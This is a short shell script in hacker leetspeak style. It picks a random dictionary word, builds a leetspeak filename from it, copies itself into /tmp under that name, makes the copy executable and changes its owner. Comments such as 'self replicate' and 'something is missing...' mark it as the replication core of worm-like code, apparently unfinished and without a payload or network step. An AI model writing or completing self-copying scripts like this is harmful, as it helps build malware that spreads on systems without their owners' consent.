#!/bin/sh 

rnd_wrd () {
  w0rd=$(/usr/bin/sort -R /usr/share/dict/words | /usr/bin/head -1) # better random words than with sed
  l33t=$(echo "$w0rd" | /usr/bin/tr aeiou @310_) # drop the vowels
  scr1pt="/tmp/$l33t.dogmeat" # where we're going
  /bin/cp $0 $scr1pt # self replicate
  /bin/chmod a+x $scr1pt # fix the perms
  /usr/sbin/chown $(/usr/bin/stat -f '%Su') $scr1pt # fix the own
  # something is missing...
}

rnd_wrd # go